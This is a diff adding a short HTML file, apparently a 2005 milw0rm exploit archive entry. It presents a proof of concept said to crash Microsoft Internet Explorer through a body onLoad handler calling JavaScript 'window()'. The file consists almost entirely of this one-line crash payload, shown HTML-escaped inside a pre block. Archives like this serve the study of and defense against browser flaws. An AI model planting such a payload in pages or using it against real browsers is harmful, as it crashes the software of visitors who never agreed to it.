@@ -1,0 +1,10 @@
+<html>
+<head>
+<title>MS Internet Explorer - javascript "window()" Crash</title>
+<pre>
+&lt;body onLoad=&quot;window()&quot;&gt;
+
+# milw0rm.com [2005-05-31]
+</pre>
+</html>
+
